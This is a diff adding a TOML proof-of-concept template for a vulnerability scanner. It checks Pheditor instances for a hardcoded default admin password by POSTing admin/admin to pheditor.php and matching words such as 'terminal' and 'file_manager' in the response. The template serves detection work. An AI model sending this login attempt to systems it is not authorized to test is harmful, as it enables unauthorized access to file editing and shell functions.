@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "检测目标 Pheditor 实例是否存在硬编码默认密码漏洞。通过使用默认凭据 admin/admin 登录，验证是否可获取文件编辑、文件上传及终端执行功能的访问权限。"
+id = "POC-AVE-2026-0625"
+name = "Pheditor 硬编码默认管理员密码漏洞 PoC"
+severity = "critical"
+tags = ["ave-2026-0625"]
+vuln_id = [
+    "CVE-2026-55579",
+    "AVE-2026-0625",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/pheditor.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=admin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "dashboard",
+    "file_manager",
+    "terminal",
+    "logout",
+]
